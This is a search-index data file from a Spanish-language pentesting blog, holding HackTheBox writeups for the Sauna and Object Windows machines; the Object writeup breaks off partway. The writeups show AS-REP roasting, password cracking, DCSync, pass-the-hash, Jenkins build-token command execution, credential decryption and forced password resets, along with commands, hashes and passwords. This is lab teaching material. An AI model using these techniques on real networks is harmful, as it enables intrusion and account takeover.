
var documents = [{
    "id": 0,
    "url": "http://localhost:4000/404.html",
    "title": "404",
    "body": "  404  ¿Equivocado o perdido?  Intenta usar la barra de busqueda o hechale un vistazo al homepage. "
    }, {
    "id": 1,
    "url": "http://localhost:4000/about",
    "title": "Apasionado de la Ciberseguridad y la Programación.",
    "body": " Pentester: Certificaciones eJPT, eCPPTv2, eWPTXv2 - Front-end Developer, Networking y Data Analyst.  "
    }, {
    "id": 2,
    "url": "http://localhost:4000/categories",
    "title": "Categories",
    "body": ""
    }, {
    "id": 3,
    "url": "http://localhost:4000/",
    "title": "Home",
    "body": "                                                                                               Maquina Sauna - htb writeup              :       El dia de hoy vamos a resolver Sauna de hackthebox una maquina windows de dificultad facil, esta vez nos enfrentamos a un jenkyll el cual vamos a explotarlo de dos. . . :                                                                                               23 Nov 2023                                                                                                                           Maquina Object - htb writeup              :       El dia de hoy vamos a resolver Oject de hackthebox una maquina windows de dificultad dificil, esta vez nos enfrentamos a un jenkyll el cual vamos a explotarlo de dos. . . :                                                                                               26 Oct 2023                                                                                                                           Maquina Minion - htb writeup              :       El dia de hoy vamos a resolver Minion de hackthebox una maquina windows de dificultad insane, esta vez vamos contra una maquina potente donde a traves de un servicio http. . . :                                                                                               17 Oct 2023                                                                                                                           Maquina Monteverde - htb writeup              :       El dia de hoy vamos a resolver Monteverde de hackthebox una maquina windows de dificultad media, para esta ocasión vamos a volver a enfrentarnos contra un DC donde obtendremos usuarios. . . :                                                                                               13 Oct 2023                                                                                                                           Maquina Forest - htb writeup              :       El dia de hoy vamos a resolver Forest de hackthebox una maquina windows de dificultad facil, en esta ocasión vamos a enfrentarnos contra un DC donde enumeraremos usuarios a traves. . . :                                                                                               11 Oct 2023                                                                                                                           Maquina Joker - htb writeup              :       El dia de hoy vamos a resolver Joker de hackthebox una maquina linux de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un squid proxy a traves. . . :                                                                                               25 Aug 2023                                   &laquo;        1        2        3        4        5        6       &raquo; "
    }, {
    "id": 4,
    "url": "http://localhost:4000/robots.txt",
    "title": "",
    "body": "      Sitemap: {{ “sitemap. xml”   absolute_url }}   "
    }, {
    "id": 5,
    "url": "http://localhost:4000/page2/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 6,
    "url": "http://localhost:4000/page3/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 7,
    "url": "http://localhost:4000/page4/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 8,
    "url": "http://localhost:4000/page5/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 9,
    "url": "http://localhost:4000/page6/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 10,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Sauna",
    "title": "Maquina Sauna - htb writeup",
    "body": "2023/11/23 - El dia de hoy vamos a resolver Sauna de hackthebox una maquina windows de dificultad facil, esta vez nos enfrentamos a un jenkyll el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del jenkins para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con bloodhound, abusaremos del permiso de ForceChangedPassword para cambiar la contraseña de un usuario y una vez como este aprovecharnos de GenericWrite para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio WriteOwner asigarnos el privilegio de DomainAdmins y asi obtener acceso completo al sistema. Maquina bastante interesante. Comenzamos como es de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Sauna❯ ls SaunaSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 175PING 10. 10. 10. 175 (10. 10. 10. 175) 56(84) bytes of data. 64 bytes from 10. 10. 10. 175: icmp_seq=1 ttl=127 time=116 ms--- 10. 10. 10. 175 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 116. 468/116. 468/116. 468/0. 000 msVemos que la maquina nos responde, con un ttl de 127 y por proximidad seria correspondiente a una maquina windows. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 175 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 93 ( https://nmap. org ) at 2023-11-23 19:04 -05Initiating SYN Stealth Scan at 19:04Scanning 10. 10. 10. 175 [65535 ports]Discovered open port 445/tcp on 10. 10. 10. 175Discovered open port 135/tcp on 10. 10. 10. 175Discovered open port 53/tcp on 10. 10. 10. 175Discovered open port 139/tcp on 10. 10. 10. 175Discovered open port 80/tcp on 10. 10. 10. 175Discovered open port 464/tcp on 10. 10. 10. 175Discovered open port 636/tcp on 10. 10. 10. 175Discovered open port 49667/tcp on 10. 10. 10. 175Discovered open port 389/tcp on 10. 10. 10. 175Discovered open port 9389/tcp on 10. 10. 10. 175Discovered open port 88/tcp on 10. 10. 10. 175Discovered open port 49673/tcp on 10. 10. 10. 175Discovered open port 593/tcp on 10. 10. 10. 175Discovered open port 49674/tcp on 10. 10. 10. 175Discovered open port 3268/tcp on 10. 10. 10. 175Discovered open port 5985/tcp on 10. 10. 10. 175Discovered open port 49676/tcp on 10. 10. 10. 175Discovered open port 3269/tcp on 10. 10. 10. 175Discovered open port 49698/tcp on 10. 10. 10. 175Completed SYN Stealth Scan at 19:04, 26. 71s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 175Host is up, received user-set (0. 14s latency). Scanned at 2023-11-23 19:04:29 -05 for 27sNot shown: 65516 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE     REASON53/tcp  open domain      syn-ack ttl 12780/tcp  open http       syn-ack ttl 12788/tcp  open kerberos-sec   syn-ack ttl 127135/tcp  open msrpc      syn-ack ttl 127139/tcp  open netbios-ssn   syn-ack ttl 127389/tcp  open ldap       syn-ack ttl 127445/tcp  open microsoft-ds   syn-ack ttl 127464/tcp  open kpasswd5     syn-ack ttl 127593/tcp  open http-rpc-epmap  syn-ack ttl 127636/tcp  open ldapssl     syn-ack ttl 1273268/tcp open globalcatLDAP  syn-ack ttl 1273269/tcp open globalcatLDAPssl syn-ack ttl 1275985/tcp open wsman      syn-ack ttl 1279389/tcp open adws       syn-ack ttl 12749667/tcp open unknown     syn-ack ttl 12749673/tcp open unknown     syn-ack ttl 12749674/tcp open unknown     syn-ack ttl 12749676/tcp open unknown     syn-ack ttl 12749698/tcp open unknown     syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 78 seconds      Raw packets sent: 131064 (5. 767MB) | Rcvd: 32 (1. 408KB)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49698 10. 10. 10. 175 -oN targetedStarting Nmap 7. 93 ( https://nmap. org ) at 2023-11-23 19:05 -05Nmap scan report for 10. 10. 10. 175Host is up (0. 26s latency). PORT   STATE SERVICE    VERSION53/tcp  open domain    Simple DNS Plus80/tcp  open http     Microsoft IIS httpd 10. 0|_http-server-header: Microsoft-IIS/10. 0|_http-title: Egotistical Bank :: Home| http-methods: |_ Potentially risky methods: TRACE88/tcp  open kerberos-sec Microsoft Windows Kerberos (server time: 2023-11-24 07:05:43Z)135/tcp  open msrpc     Microsoft Windows RPC139/tcp  open netbios-ssn  Microsoft Windows netbios-ssn389/tcp  open ldap     Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK. LOCAL0. , Site: Default-First-Site-Name)445/tcp  open microsoft-ds?464/tcp  open kpasswd5?593/tcp  open ncacn_http  Microsoft Windows RPC over HTTP 1. 0636/tcp  open tcpwrapped3268/tcp open ldap     Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK. LOCAL0. , Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found9389/tcp open mc-nmf    . NET Message Framing49667/tcp open msrpc     Microsoft Windows RPC49673/tcp open ncacn_http  Microsoft Windows RPC over HTTP 1. 049674/tcp open msrpc     Microsoft Windows RPC49676/tcp open msrpc     Microsoft Windows RPC49698/tcp open msrpc     Microsoft Windows RPCService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: |  date: 2023-11-24T07:06:39|_ start_date: N/A| smb2-security-mode: |  311: |_  Message signing enabled and required|_clock-skew: 6h59m58sService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 106. 74 secondsEntre los puertos abiertos mas relevantes podemos visualizar:       Puerto   Servicio   Versión         53   DNS   Simple DNS Plus       80   HTTP   Microsoft IIS httpd 10. 0       88   KERBEROS   Microsoft Windows Kerberos       135   RPC   Microsoft Windows RPC       389   LDAP   Microsoft Windows Active Directory LDAP       445   SMB   ?       3268   LDAP   Microsoft Windows Active Directory LDAP       5985   WINRM   Microsoft HTTPAPI httpd 2. 0   EXPLOTACION #: Como vemos que el puerto 80 corresponde a un servicio web con whatweb vamos a tratar de enumerar las tecnolologias que emplean. ❯ whatweb http://10. 10. 10. 175http://10. 10. 10. 175 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email. com,info@example. com], HTML5, HTTPServer[Microsoft-IIS/10. 0], IP[10. 10. 10. 175], Microsoft-IIS[10. 0], Script, Title[Egotistical Bank :: Home]Vemos que nos enfrentamos a un IIS, y concretamente en la seccion de about, podemos ver varios nombres potecialmente a ser usuarios validos.  Vamos a almacenar los usuarios en un archivo, y como es comun lo haremos bajo la primera inicial del nombre y el apellido, como se muestran a continuación. Ahora vamos a usar crackmapexec para realizar una enumeración por smb. ❯ crackmapexec smb 10. 10. 10. 175SMB     10. 10. 10. 175  445  SAUNA      [*] Windows 10. 0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK. LOCAL) (signing:True) (SMBv1:False)y agregaremos el dominio al /etc/hosts. ❯ echo  10. 10. 10. 172 EGOTISTICAL-BANK. LOCAL  &gt;&gt; /etc/hostsAhora si con kerbrute enumeramos los usuarios validos, la herramienta nos muestra que Fsmith es valido. ❯ /opt/kerbrute/kerbrute userenum users --dc 10. 10. 10. 175 -d EGOTISTICAL-BANK. LOCAL  __       __        __    / /_____ _____/ /_ _______ __/ /____  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\___/_/ /_. ___/_/  \__,_/\__/\___/                    Version: dev (n/a) - 11/23/23 - Ronnie Flathers @ropnop2023/11/23 19:21:18 &gt; Using KDC(s):2023/11/23 19:21:18 &gt; 	10. 10. 10. 175:882023/11/23 19:21:18 &gt; [+] VALID USERNAME:	Fsmith@EGOTISTICAL-BANK. LOCAL2023/11/23 19:21:18 &gt; Done! Tested 6 usernames (1 valid) in 0. 310 secondsProcedemos a usar GetNPUsers para ejecutar un ASRepRoast y obtener un TGT. ❯ GetNPUsers. py EGOTISTICAL-BANK. LOCAL/ -no-pass -usersfile uservalidImpacket v0. 11. 0 - Copyright 2023 Fortra$krb5asrep$23$fsmith@EGOTISTICAL-BANK. LOCAL:34df8e0e65cf634b68d04ae2df6e86d9$831b6eae128953abd71def69f04090582868598f156a6c40de789274d7702adc542d91857ee30ab39d7d280def70a6cc8cbda911a7ab0603e307166770bff2c7f9751b64df908cc27cabc6536f1f5b3e539c9fbc8529ec457308ed1798b9dc3bb86f839d23d0260138e386fb9d8335a7d98652329cb623899c16d1b744846337529b4057017b66ccd9b65035ab8cb619c5e89b0facf8334b75944a40b79c7a7a16c457c639d0801fa2855108b70e896efdf1613c1704583030181459258fedb2ff266fc0700ddded76d05759a8b278539cfb125d39b10e33815e49506ce8f724e6e5473c7e45966ec75bdb0c0d7a78b42a710f387324d32b689a9314c4a1f596y ahora procedemos a crackear el hash con john y obtenemos unas credenciales jsmith:Thestrokes23. ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])Will run 6 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusThestrokes23   ($krb5asrep$23$fsmith@EGOTISTICAL-BANK. LOCAL)1g 0:00:00:06 DONE (2023-11-23 19:39) 0. 1477g/s 1556Kp/s 1556Kc/s 1556KC/s Tiffani1432. . Thanongsuk_policeUse the  --show  option to display all of the cracked passwords reliablySession completedNos conectamos con evil-winrm como el usuario fsmith y procedemos a leer la primera flag user. txt.  ELEVACION DE PRIVILEGIOS #: Usaremos ldapdomaindump para enumerar los usuarios y saber los grupos a los cuales pertenecen. ❯ python3 /opt/ldapdomaindump/ldapdomaindump -u 'EGOTISTICAL-BANK. LOCAL\fsmith' -p 'Thestrokes23' 10. 10. 10. 175[*] Connecting to host. . . [*] Binding to host[+] Bind OK[*] Starting domain dump[+] Domain dump finished❯ ls domain_computers. grep  domain_computers_by_os. html  domain_groups. json  domain_policy. json  domain_trusts. json  domain_users. json       users domain_computers. html  domain_groups. grep       domain_policy. grep  domain_trusts. grep  domain_users. grep   domain_users_by_group. html  uservalid domain_computers. json  domain_groups. html       domain_policy. html  domain_trusts. html  domain_users. html   hashSI ahora visualizamos vemos en nuestro navegador los grupos pertenecientes.  Podemos ver que ademas de fsmith, el usuario svc_loanmgr tambien es parte del grupo Remote Management Users. Ahora para enumerar el sistema ya que estamos como el usuario fsmith vamos a usar ha herramienta winpeas. exe, la cual podemos obtener del repositorio de GitHub.  Winpeas. exe*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; upload /home/fmiracle/machines/Sauna/content/winPEASany. exe                    Info: Uploading /home/fmiracle/machines/Sauna/content/winPEASany. exe to C:\Users\FSmith\Documents\winPEASany. exe                    Data: 3183956 bytes of 3183956 bytes copied                    Info: Upload successful!Despues de ejecutar obtenemos las credenciales del usuario svc_loanmanager.  Ahora podemos conectarnos como el usuario svc_loanmanager. ❯ evil-winrm -i 10. 10. 10. 175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'                    Evil-WinRM shell v3. 5                    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                    Data: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completion                    Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; whoamiegotisticalbank\svc_loanmgrPara enumerar el sistema ahora como el usuario actual usaremos sharphound. ps1, para ello podemos descargarlo del repositorio en el siguiente enlance:  Sharphound. ps1Subimos el script a la maquina victima, importamos y ejecutamos. *Evil-WinRM* PS C:\Windows\Temp\privesc&gt; upload /home/fmiracle/machines/Sauna/content/SharpHound. ps1                    Info: Uploading /home/fmiracle/machines/Sauna/content/SharpHound. ps1 to C:\Windows\Temp\privesc\SharpHound. ps1                    Data: 1744464 bytes of 1744464 bytes copied                    Info: Upload successful!*Evil-WinRM* PS C:\Windows\Temp\privesc&gt; Import-Module . \SharpHound. ps1*Evil-WinRM* PS C:\Windows\Temp\privesc&gt; Invoke-BloodHound -CollectionMethods AllY traemos el comprimido que nos crea a nuestra maquina. *Evil-WinRM* PS C:\wINDOWS\tEMP\Privesc&gt; download C:\wINDOWS\tEMP\Privesc\20231124015657_BloodHound. zip                    Info: Downloading C:\wINDOWS\tEMP\Privesc\20231124015657_BloodHound. zip to 20231124015657_BloodHound. zip                    Info: Download successful!Subimos el comprimido al bloodhound.  Ahora marcamos al usuario svc_loanmgr como owned.  Vemos que el usuario tiene privilegios GetChangesAll sobre el dominio.  Si ahora vemos que podemos hacer con este privilegio, bloodhound nos indica que podemos efectuar en DCSync Attack.  Para ello podemos usar secretsdump para poder dumpearnos todos los hashes, incluido el del usuario Administrator.  Seguidamente podemos aplicar un pass the hash con psexec y conectarnos como el usuario administrator. ❯ psexec. py EGOTISTICAL-BANK. LOCAL/Administrator@10. 10. 10. 175 -hashes :823452073d75b9d1cf70ebdf86c7f98eImpacket v0. 11. 0 - Copyright 2023 Fortra[*] Requesting shares on 10. 10. 10. 175. . . . . [*] Found writable share ADMIN$[*] Uploading file JfTdhTjz. exe[*] Opening SVCManager on 10. 10. 10. 175. . . . . [*] Creating service mLSo on 10. 10. 10. 175. . . . . [*] Starting service mLSo. . . . . [!] Press help for extra shell commandsMicrosoft Windows [Version 10. 0. 17763. 973](c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt; whoamint authority\systemFInalmente nos dirigimos al directorio personal del usuario Administrator y podemos visualizar la segunda flag root. txt. C:\Windows\system32&gt; cd C:\Users\Administrator\DesktopC:\Users\Administrator\Desktop&gt; type root. txt3663f10ee0496eaccec1c7a21f3f8faf"
    }, {
    "id": 11,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Object",
    "title": "Maquina Object - htb writeup",
    "body": "2023/10/26 - El dia de hoy vamos a resolver Oject de hackthebox una maquina windows de dificultad dificil, esta vez nos enfrentamos a un jenkyll el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del jenkins para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con bloodhound, abusaremos del permiso de ForceChangedPassword para cambiar la contraseña de un usuario y una vez como este aprovecharnos de GenericWrite para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio WriteOwner asigarnos el privilegio de DomainAdmins y asi obtener acceso completo al sistema. Maquina bastante interesante. Comenzamos como es de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Object❯ ls ObjectSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 11. 132PING 10. 10. 11. 132 (10. 10. 11. 132) 56(84) bytes of data. 64 bytes from 10. 10. 11. 132: icmp_seq=1 ttl=127 time=143 ms--- 10. 10. 11. 132 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 143. 382/143. 382/143. 382/0. 000 msVemos que la maquina nos responde, con un ttl de 127 y por proximidad seria correspondiente a una maquina windows. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 11. 132 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 93 ( https://nmap. org ) at 2023-10-26 17:58 -05Initiating SYN Stealth Scan at 17:58Scanning 10. 10. 11. 132 [65535 ports]Discovered open port 80/tcp on 10. 10. 11. 132Discovered open port 8080/tcp on 10. 10. 11. 132Discovered open port 5985/tcp on 10. 10. 11. 132Completed SYN Stealth Scan at 17:58, 26. 99s elapsed (65535 total ports)Nmap scan report for 10. 10. 11. 132Host is up, received user-set (0. 20s latency). Scanned at 2023-10-26 17:58:21 -05 for 27sNot shown: 65532 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE  REASON80/tcp  open http    syn-ack ttl 1275985/tcp open wsman   syn-ack ttl 1278080/tcp open http-proxy syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 27. 10 seconds      Raw packets sent: 131085 (5. 768MB) | Rcvd: 22 (968B)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p80,5985,8080 10. 10. 11. 132 -oN targetedStarting Nmap 7. 93 ( https://nmap. org ) at 2023-10-26 18:00 -05Nmap scan report for 10. 10. 11. 132Host is up (0. 25s latency). PORT   STATE SERVICE VERSION80/tcp  open http  Microsoft IIS httpd 10. 0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0|_http-title: Mega Engines5985/tcp open http  Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2. 08080/tcp open http  Jetty 9. 4. 43. v20210629|_http-title: Site doesn't have a title (text/html;charset=utf-8). |_http-server-header: Jetty(9. 4. 43. v20210629)| http-robots. txt: 1 disallowed entry |_/Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23. 27 secondsEntre los puertos abiertos mas relevantes podemos visualizar:       Puerto   Servicio   Versión         80   HTTP   Microsoft IIS httpd 10. 0       8080   HTTP   Jetty 9. 4. 43. v20210629       5985   HTTP   WINRM   EXPLOTACION #: Como vemos que los puertos 80 y 8080 corresponde a un servicio web con whatweb vamos a tratar de enumerar las tecnolologias que emplean. ❯ whatweb http://10. 10. 11. 132http://10. 10. 11. 132 [200 OK] Country[RESERVED][ZZ], Email[ideas@object. htb], HTML5, HTTPServer[Microsoft-IIS/10. 0], IP[10. 10. 11. 132], JQuery[2. 1. 3], Microsoft-IIS[10. 0], Modernizr, Script, Title[Mega Engines]❯ whatweb http://10. 10. 11. 132:8080http://10. 10. 11. 132:8080 [403 Forbidden] Cookies[JSESSIONID. c4a63e7b], Country[RESERVED][ZZ], HTTPServer[Jetty(9. 4. 43. v20210629)], HttpOnly[JSESSIONID. c4a63e7b], IP[10. 10. 11. 132], Jenkins[2. 317], Jetty[9. 4. 43. v20210629], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]http://10. 10. 11. 132:8080/login?from=%2F [200 OK] Cookies[JSESSIONID. c4a63e7b], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9. 4. 43. v20210629)], HttpOnly[JSESSIONID. c4a63e7b], IP[10. 10. 11. 132], Jenkins[2. 317], Jetty[9. 4. 43. v20210629], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]Vemos que nos enfrentamos a un IIS y en el puerto 8080 a un jenkyll, asi que vamos a proceder a abrirnos el servicio en nuestro navegador.  Vemos la opcion de crear cuenta, asi vamos a proceder a registrarnos.  Una vez creamos nuestra cuenta, nos redirigimos a un panel de usuario.  Dentro podemos crear un proyecto al cual llamare test.  Tendremos una serie de opciones como agregar un nombre.  Y en la parte de build triggers, seleccionar que se ejecute periodicamente y configurar la ejecución cada minuto como si fuera una tarea cron.  Despues en build seleccionar ejecutar comando de windows.  Aqui agregaremos el comando que deseamos ejecutar, Aplicamos los cambios y guardamos.  Pasado un minuto vemos en nuestro build history vemos dos compilaciones.  Seleccionamos cualquiera y en console output vemos que se ejecuto el comando correctamente.  Otra forma mas comoda en la que podemos ejecutar comandos es a traves de la creación de un token, esto podemos hacerlo en la configuración de nuestro perfil.  Ahora en la configuración de nuestro proyecto debemos indicarle esta vez en lanzar ejecuciones remotas y ahora a esa url generada debemos de tramitarle una petición con la autenticacion requerida, donde debemos indicarle nuestro usuario y el token.  Esta vez trataremos de ejecutar otro comando para listar el directorio actual.  Lanzamos la petición con curl. ❯ curl -s -X GET  http://fmiracle:1120abc86ec7661ac09d63349eb055baff@10. 10. 11. 132:8080/job/test/build?token=myToken Recargamos la pagina y vemos que se genero otro build.  Seleccionamos el nuevo build y vemos que el codigo se ejecuto correctamente.  Ahora podriamos tratar de ganar acceso al sistema a traves de una conexión por tcp o udp a nuestra maquina, pero si hacemos el mismo proceso y ejecutamos esta sentencia en powershell podemos ver mediante las reglas de firewall que unicamente tenemos permitido el icmp.  Vimos anteriormente que listando el directorio existia uno llamado . jenkys, asi que vamos a listar los recursos dentro de este, esto lo logramos ejecutando los mismos pasos anteriores.  Vemos los directorios users y secrets y si lo listamos vemos los usuarios existentes.  Si listamos ahora lo que hay en admin, encontramos un archivo config. xml, que si lo leemos vemos la contraseña del usuario encryptada.  Esta contraseña podemos tratar de desencriptarla, pero para ello vamos a necesitar los archivos del directorio secrets los archivos master. key y hudson. util. secret.  Primero vamos a copiarnos el master. key No olvidemos que hay quitar el salto de linea para que no de problemas. ❯ cat master. key| tr -d '\n' | sponge master. keyAhora nos copiaremos el hudson pero debido a que este no es legible primero lo vamos a convertir a base64.  Una vez que tenemos los 3 archivos. ❯ ls config. xml  hudson. util. Secret  master. keyVamos a utilizar la herramienta del repositorio de hoto:  jenkins-credentials-decryptorSolo debes ejecutar este comando para tenerla. curl -L \  https://github. com/hoto/jenkins-credentials-decryptor/releases/download/1. 2. 0/jenkins-credentials-decryptor_1. 2. 0_$(uname -s)_$(uname -m)  \  -o jenkins-credentials-decryptorchmod +x jenkins-credentials-decryptorEjecutamos con los parametros correspondientes, indicando cada archivo y obtenemos la contraseña en texto claro. ❯ . /jenkins-credentials-decryptor -c config. xml -m master. key -s hudson. util. Secret[ {   id :  320a60b9-1e5c-4399-8afe-44466c9cde9e ,   password :  c1cdfun_d2434\u0003\u0003\u0003 ,   username :  oliver  }]Ahora que el servicio de winrm esta activo, podemos conectarnos usando estas credenciales al equipo y obtenemos la primera flag user. txt. ❯ evil-winrm -i 10. 10. 11. 132 -u 'oliver' -p 'c1cdfun_d2434'Evil-WinRM shell v3. 5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\oliver\Documents&gt; whoamiobject\oliver ELEVACION DE PRIVILEGIOS #: Vamos a utilizar sharphound para enumerar el sistema y visualizar los resultados en bloodhound.  SharpHound. ps1Subimos el sharphound al equipo importandolo directamente con Iex. *Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; upload /home/fmiracle/machines/Oject/content/SharpHound. ps1                    Info: Uploading /home/fmiracle/machines/Oject/content/SharpHound. ps1 to C:\Windows\Temp\Privesc\SharpHound. ps1                    Data: 1297764 bytes of 1297764 bytes copied                    Info: Upload successful!*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Import-Module . \SharpHound. ps1 Nos transferimos el comprimido y lo abrimos en bloodhound. *Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; download C:\Windows\Temp\Privesc\20231026165356_BloodHound. zip                    Info: Downloading C:\Windows\Temp\Privesc\20231026165356_BloodHound. zip to 20231026165356_BloodHound. zip                    Info: Download successful! Observamos que el usuario oliver tenemos el permiso de ForceChangedPassword sobre smith.  Si vamos a la opción abuse info, vemos una manera de poder aprovecharnos de este privilegio, para ello primero debemos generar una contraseña en formato SecureString y ejecutar Set-DomainUserPassword que es una función de Powerview. ps1 asi que primero debemos descargarnos el script e importarnos el modulo.   PowerView. ps1*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Import-Module . \PowerView. ps1*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Set-DomainUserPassword -Identity smith -AccountPassword $secPasswordValidamos y nos conectamos exitosamente como smith con la credencial que definimos. ❯ evil-winrm -i 10. 10. 11. 132 -u 'smith' -p 'Password123!'                    Evil-WinRM shell v3. 5                    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                    Data: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completion                    Info: Establishing connection to remote endpointAhora que somo smith vamos a marcarlo como Owned y veamos con que permisos cuenta este nuevo usuario.  Vemos que este nuevo usuario tiene el privilegio de GenericWrite sobre maria, y si vamos a abuse info nos dice que podemos tratar de ejecutar un 